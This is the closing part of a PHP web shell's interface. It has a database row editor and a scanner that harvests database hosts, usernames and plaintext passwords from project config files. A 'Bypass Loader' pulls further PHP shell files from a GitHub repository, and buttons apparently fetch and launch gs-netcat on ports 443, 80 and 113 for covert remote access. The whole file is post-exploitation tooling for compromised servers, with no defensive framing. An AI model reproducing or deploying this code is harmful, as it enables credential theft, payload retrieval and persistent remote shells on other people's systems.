                                                                <td>
                                                                    <?php
                                                                    // build primary key map: try to use 'id' or all key columns
                                                                    $pk = array();
                                                                    foreach ($table_structure as $col) {
                                                                        if (isset($col['Key']) && strtoupper($col['Key']) === 'PRI') {
                                                                            $pk[$col['Field']] = isset($row[$col['Field']]) ? $row[$col['Field']] : null;
                                                                        }
                                                                    }
                                                                    if (empty($pk) && isset($row['id'])) { $pk['id'] = $row['id']; }
                                                                    $pk_ser = base64_encode(serialize($pk));
                                                                    ?>
                                                                    <form method="POST" style="display:inline;">
                                                                        <input type="hidden" name="pk" value="<?php echo htmlspecialchars($pk_ser); ?>">
                                                                        <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_current_table); ?>">
                                                                        <?php $rowId = substr(md5($pk_ser.$db_current_table),0,8); ?>
                                                                        <a href="#edit-<?php echo $rowId; ?>" class="btn">Edit</a>
                                                                        <button type="submit" name="delete_row" class="btn btn-danger" onclick="return confirm('Delete this row?')">Delete</button>
                                                                        <button type="submit" name="duplicate_row" class="btn" style="margin-left:6px;">Duplicate</button>
                                                                    </form>
                                                                    <div id="edit-<?php echo $rowId; ?>" class="edit-row" style="margin-top:8px;">
                                                                        <form method="POST">
                                                                            <input type="hidden" name="pk" value="<?php echo htmlspecialchars($pk_ser); ?>">
                                                                            <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_current_table); ?>">
                                                                            <input type="hidden" name="update_row" value="1">
                                                                            <?php foreach ($cols as $c): ?>
                                                                                <div style="margin-bottom:6px;"><label style="display:block; font-size:0.9rem; color:#9fb7d8;"><?php echo htmlspecialchars($c); ?></label>
                                                                                    <input type="text" name="fields[<?php echo htmlspecialchars($c); ?>]" value="<?php echo htmlspecialchars(isset($row[$c]) ? $row[$c] : ''); ?>" class="form-control"></div>
                                                                            <?php endforeach; ?>
                                                                            <div style="display:flex; gap:10px;">
                                                                                <button type="submit" class="btn btn-success">Save</button>
                                                                                <a href="#" class="btn">Cancel</a>
                                                                            </div>
                                                                        </form>
                                                                    </div>
                                                                </td>
                                                            </tr>
                                                        <?php endforeach; ?>
                                                </tbody>
                                            </table>
                                        </div>
                                        <div style="margin-top:8px;">
                                            <?php if (isset($total_rows)): ?>
                                                <small><?php echo intval($total_rows); ?> total rows</small>
                                                <?php
                                                $tbl_pages = max(1, ceil($total_rows / 50));
                                                for ($tp = 1; $tp <= $tbl_pages; $tp++): ?>
                                                    <a href="?mode=sql&table=<?php echo urlencode($db_current_table); ?>&tblpage=<?php echo $tp; ?>" class="btn" style="padding:4px 8px; margin-left:6px;<?php echo $tp == (isset($tbl_page) ? $tbl_page : 1) ? ' background:rgba(59,130,246,0.12);' : ''; ?>"><?php echo $tp; ?></a>
                                                <?php endfor; ?>
                                            <?php endif; ?>
                                        </div>
                                    <?php else: ?>
                                        <div style="color:#9fb7d8; margin-top:8px;">No rows or cannot read table.</div>
                                    <?php endif; ?>
                                </div>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    <?php elseif ($mode === 'scan'): ?>
        <!-- DATABASE SCANNER MODE -->
        <div class="card">
            <h3>Database Configuration Scanner</h3>
            <p style="color: #666; margin-bottom: 20px;">Scan your project directory to find database configurations from popular frameworks.</p>
            
            <form method="POST">
                <div class="grid">
                    <div class="form-group">
                        <label>📂 Directory to Scan:</label>
                        <input type="text" name="scan_path" value="<?php echo htmlspecialchars(getcwd()); ?>" class="form-control">
                    </div>
                    <div class="form-group">
                        <label>📊 Max Files to Scan:</label>
                        <input type="number" name="max_files" value="2000" class="form-control">
                    </div>
                    <div class="form-group">
                        <label>💾 Max Bytes per File:</label>
                        <input type="number" name="max_bytes" value="262144" class="form-control">
                    </div>
                </div>
                <button type="submit" name="scan_configs" class="btn btn-success" style="margin-top: 15px;">🔍 Start Scanning</button>
            </form>
        </div>

        <?php if ($scan_result !== null): ?>
            <div class="card">
                <h3>📋 Scan Results</h3>
                
                <?php if ($scan_msg): ?>
                    <div class="alert alert-danger">
                        ❌ Error: <?php echo htmlspecialchars($scan_msg); ?>
                    </div>
                <?php elseif (!empty($scan_result['items'])): ?>
                    <div style="margin-bottom: 15px;">
                        <strong>✅ Found <?php echo count($scan_result['items']); ?> database configurations</strong><br>
                        <small style="color: #666;">Scan completed in <?php echo number_format($scan_dur, 3); ?> seconds</small>
                    </div>
                    
                    <table class="table">
                        <thead>
                            <tr>
                                <th>📄 File</th>
                                <th>🏠 Host</th>
                                <th>👤 Username</th>
                                <th>🔑 Password</th>
                                <th>🗄️ Database</th>
                                <th>🏷️ Type</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($scan_result['items'] as $item): ?>
                                <tr>
                                    <td style="word-break: break-all;"><?php echo htmlspecialchars(isset($item['file']) ? $item['file'] : ''); ?></td>
                                    <td><?php echo htmlspecialchars(isset($item['host']) ? $item['host'] : ''); ?></td>
                                    <td><?php echo htmlspecialchars(isset($item['user']) ? $item['user'] : ''); ?></td>
                                    <td><?php echo htmlspecialchars(isset($item['pass']) ? $item['pass'] : ''); ?></td>
                                    <td><?php echo htmlspecialchars(isset($item['db']) ? $item['db'] : ''); ?></td>
                                    <td><?php echo htmlspecialchars(isset($item['hint']) ? $item['hint'] : ''); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php elseif ($scan_dur !== null && !$scan_msg): ?>
                    <div style="margin-top: 15px; color: #666; font-style: italic; text-align: center; padding: 40px;">
                        <div style="font-size: 3em; margin-bottom: 15px;">🔍</div>
                        <strong>No database configurations found</strong><br>
                        <small>Try scanning a different directory or increasing the file/byte limits</small>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    <?php elseif ($mode === 'bypass'): ?>
        <div class="card">
            <h3>Bypass Loader</h3>
            <p style="color:#9fb7d8;">Klik salah satu tombol di bawah untuk mengambil konten dari URL terkait. Hanya ditampilkan sebagai teks (tidak dieksekusi).</p>
            <?php
                $bypass_links = array(
                    '1' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/1.php',
                    '2' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/2.php',
                    '3' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/3.php',
                    '4' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/4.php',
                    '5' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/5.php',
                );
            ?>
            <div style="display:flex;flex-wrap:wrap;gap:10px;margin-bottom:14px;">
                <?php foreach ($bypass_links as $k=>$v): ?>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="bypass_url" value="<?php echo htmlspecialchars($v); ?>">
                        <button type="submit" name="bypass_fetch" class="btn">Bypass <?php echo htmlspecialchars($k); ?></button>
                    </form>
                <?php endforeach; ?>
            </div>
            <div class="form-group">
                <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">Output</label>
                <textarea readonly style="width:100%;min-height:260px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;">
<?php echo htmlspecialchars($bypass_output); ?>
                </textarea>
            </div>
            <hr style="margin:25px 0;border:0;border-top:1px solid rgba(255,255,255,0.08);">
            <h3 style="margin:0 0 12px;">GS-Netcat Quick Commands</h3>
            <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
                <form method="POST" style="display:inline;">
                    <button type="submit" name="gs_cmd" value="curl_gs_netcat" class="btn">curl gs-netcat</button>
                </form>
                <form method="POST" style="display:inline;">
                    <button type="submit" name="gs_cmd" value="wget_gs_netcat" class="btn">wget gs-netcat</button>
                </form>
                <form method="POST" style="display:inline;">
                    <button type="submit" name="gs_cmd" value="gs_443" class="btn">GS_PORT=443</button>
                </form>
                <form method="POST" style="display:inline;">
                    <button type="submit" name="gs_cmd" value="gs_80" class="btn">GS_PORT=80</button>
                </form>
                <form method="POST" style="display:inline;">
                    <button type="submit" name="gs_cmd" value="gs_113" class="btn">GS_PORT=113</button>
                </form>
            </div>
            <div class="form-group">
                <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">GS-Netcat Output</label>
                <textarea readonly style="width:100%;min-height:180px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;" placeholder="GS-Netcat command output..."><?php echo htmlspecialchars($gs_output); ?></textarea>
            </div>
        </div>
    <?php endif; ?>
</div>
</body>
<script>
function toggleEdit(btn) {
    var parent = btn.parentNode;
    // find sibling .edit-row
    var sibling = parent.nextElementSibling;
    if (!sibling || sibling.className.indexOf('edit-row') === -1) {
        // maybe wrapped differently, search downwards
        var el = parent.parentNode.querySelector('.edit-row');
        sibling = el;
    }
    if (sibling) {
        sibling.style.display = (sibling.style.display === 'none' || sibling.style.display === '') ? 'block' : 'none';
    }
}
</script>
<!-- No JS needed for modals; using CSS :target -->
</html>
